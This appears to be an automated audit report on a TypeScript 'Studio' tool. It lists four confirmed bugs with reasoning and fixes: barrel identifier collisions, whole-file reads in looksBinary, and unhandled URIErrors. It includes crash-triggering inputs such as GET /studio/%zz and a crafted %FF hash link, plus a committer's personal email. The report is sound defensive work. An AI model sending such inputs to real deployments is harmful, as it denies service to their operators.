- **Reasoning:** Verified the collision mechanics directly in barrel.ts: moduleIdentifier (L18-21) strips non-alphanumeric runs and uppercases the following letter, so 'my-mod' → myMod (identical to a literal myMod.ts) and 'a_b' → aB (identical to aB.ts); distinct filenames deterministically collapse onto one identifier. barrelSource (L29-30) builds entries from a Set of basenames — deduplicating basenames only — and emits one 'import * as <id> from "./<base>";' per entry, so two colliding entries produce two import bindings with the same identifier, which is a duplicate-declaration syntax/type error that breaks the regenerated graft/index.ts compilation entirely. The inputs are real disk state: listGraftModules feeds top-level graft/ filenames and planAdd adds manifest targets, and nothing upstream enforces a single naming convention, so mixed kebab/camel naming triggers this deterministically. Because the file is header-marked generated infra ('do not edit'), the operator has no sanctioned workaround short of renaming modules. The unit tests only cover basename dedupe ('comments' twice) and never identifier collisions, confirming the gap is unnoticed. Severity BUG is right: it breaks the build but is not security-relevant.

moduleIdentifier (L18-21) maps distinct module basenames onto the same camelCase identifier: graft/my-mod.ts and graft/myMod.ts both become myMod, and graft/a_b.ts collides with graft/aB.ts ('_' is consumed by [^a-zA-Z0-9]+ and the following letter uppercased). barrelSource (L29-30) dedupes basenames but not resulting identifiers, so it emits `import * as myMod from "./my-mod";` and `import * as myMod from "./myMod";` — duplicate declarations that make the regenerated graft/index.ts fail TypeScript compilation. Since the header marks the barrel 'do not edit' generated infra, a developer hitting this has no sanctioned fix path. listGraftModules feeds real disk filenames into this, so mixed kebab/camel naming in one project triggers it deterministically.

**Recommendation:** Detect collisions in barrelSource: if two entries map to the same identifier, either throw a descriptive GraftError telling the operator which filenames conflict, or disambiguate deterministically (e.g., append a numeric suffix) while keeping imports valid.

---

### looksBinary reads entire files into memory just to test the first 8KB

- **File:** `packages/studio/src/git.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 364, 367, 368
- **Slug:** other-resource-exhaustion
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified exactly as described in git.ts L364-369: looksBinary() calls statSync only to short-circuit zero-byte files, then executes `const buffer = readFileSync(fullPath); return buffer.subarray(0, 8000).includes(0);`. Despite the comment ('a NUL byte in the first block') and despite subarray being zero-copy, readFileSync allocates and holds the ENTIRE file in memory just to inspect the first 8KB. Every diff render of a changed file goes through this function (readFileDiff calls it before anything else), so a multi-gigabyte file sitting in the content tree — reachable via a cloned repo or any content-write flow — makes each GET /changes/diff allocate the whole file, plausibly OOM-ing the Studio process. The fix (fs.open + read into an 8KB buffer) is trivial and the current behavior is plainly unintended given the comment. Real bug, BUG severity correct.

looksBinary() (L364-369) calls statSync only to short-circuit zero-byte files, then readFileSync(fullPath) loads the WHOLE file into a Buffer solely to run .includes(0) on the first 8000 bytes. A multi-gigabyte file placed in the content directory (committed by an agent via write flows, or present in a cloned repo) makes every diff/status render attempt allocate the full file in memory, which can OOM the Studio process — turning a routine UI action into a remote-ish denial of service against the local tool. The comment says 'a NUL byte in the first block' but the code reads far more than a block.

**Recommendation:** Open the file with fs.open + read into an 8KB buffer (or stream the first block) instead of readFileSync of the whole file.

---

### Malformed percent-encoding in UI asset path throws URIError, escaping the handler as a generic 500

- **File:** `packages/studio/src/handler.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 52, 74, 141
- **Slug:** other-unhandled-exception
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified both escape paths. resolveUiFile() (handler.ts L52) calls decodeURIComponent(rel) on the raw pathname segment BEFORE the containment check and before serveUiAsset's try/catch (which only wraps readFileSync after resolution); createStudioHandler itself has no try/catch around the static branch, so GET /studio/%zz throws URIError out of the handler into createNodeListener's catch-all, which returns a misleading 500 FUNCTION_EXECUTION_FAILED ('the adapter should never throw') — WHATWG URL parsing preserves invalid percent sequences like '%zz' in pathname, so the input is reachable. Same class inside api.ts: decodeURIComponent of the approval/revert route ids sits inside the big try/catch but URIError is not a GraftError, so it is rethrown and likewise surfaces as the adapter's generic 500 instead of a 4xx. As the finding states, containment itself is sound (resolve+prefix blocks ../, absolute paths, NUL, Windows separators) and the redirect reuses only the request origin, so impact is confined to wrong status codes and log noise. Accurate BUG.

resolveUiFile() calls decodeURIComponent(rel) (L52) on a path segment taken straight from the request pathname. Unlike the API branch, the static-serving branch of createStudioHandler has no try/catch, so a request like GET /studio/%zz makes decodeURIComponent throw URIError, which propagates out of the handler entirely; the Node adapter (createNodeListener) catches it and answers with a misleading 500 FUNCTION_EXECUTION_FAILED ('the adapter should never throw'). The same pattern exists inside api.ts for decodeURIComponent of approval/revert ids (there it lands in the try/catch but is rethrown because URIError is not a GraftError). Not exploitable beyond log noise / wrong status codes — path containment itself (resolve + prefix check) correctly blocks ../, absolute paths, NUL and Windows separators, and the redirect target only ever reuses the request's own origin.

**Recommendation:** Wrap decodeURIComponent in try/catch and return null (404) on malformed input, both in resolveUiFile and for decoded route ids in api.ts.

---

### Uncaught URIError from decodeURIComponent crashes the SPA on malformed hash routes

- **File:** `packages/studio/src/ui/lib/route.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 32
- **Slug:** other-unhandled-urierror
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end in packages/studio/src/ui/lib/route.ts. Line 32 maps every hash segment through bare decodeURIComponent with no try/catch; per ECMA-262/WHATWG this throws URIError for '%', '%ZZ', '%FF' (invalid UTF-8), and '%ED%A0%80' (lone surrogate). The sink sits in two live paths: useRoute()'s useState lazy initializer (line 55), which runs synchronously during StudioApp's first render, and the hashchange listener (line 58). main.tsx mounts <StudioApp/> directly under createRoot and a repo-wide grep of src/ui finds no ErrorBoundary, componentDidCatch, or onUncaughtError handler, so a render-phase throw unmounts the tree and leaves a persistent blank SPA until the operator hand-edits the URL. Attack vector is concrete: browsers preserve percent-octets in location.hash verbatim without validating UTF-8, so a crafted/phished link like http://127.0.0.1:4983/#/collections/%FF reliably triggers the throw on load; fragments never touch the server, so no backend mitigation applies. Impact is bounded client-side denial of service of the operator's editing session (no XSS — the URIError throws before any decoded value reaches the DOM; no auth or data impact), which matches the assigned BUG severity, so no adjustment is needed. The code was introduced unchanged in commit 3fc8ea9 with no subsequent guard, ruling out 'fixed', and this is the only finding for this file, ruling out 'duplicate'. The finding's aside that the scanner's insecure-crypto flag on this file is a false positive is itself correct — the file contains no cryptographic code.

parseHash() calls decodeURIComponent on every segment of window.location.hash without guarding against malformed percent-encoding. Inputs such as '%', '%ZZ', '%FF', or lone-surrogate escapes ('%ED%A0%80') throw a URIError in all modern engines. Because parseHash runs inside the useState initializer of useRoute(), simply loading a URL with a malformed hash (e.g., http://127.0.0.1:4983/#/collections/%FF) throws during initial render and white-screens the entire Studio SPA until the operator manually edits the URL; the hashchange listener path also throws an unhandled exception. Any attacker can craft such a link (the hash is attacker-controlled in shared/phished URLs), producing reliable client-side denial of service for the operator's editing session. Note: the scanner's 'insecure-crypto' flag on this file is a false positive - there is no cryptographic code here.

**Recommendation:** Wrap each decodeURIComponent call in try/catch (or use a safe-decode helper that falls back to the raw segment on URIError), so malformed hashes degrade to the overview view instead of throwing during render or event handling.

---

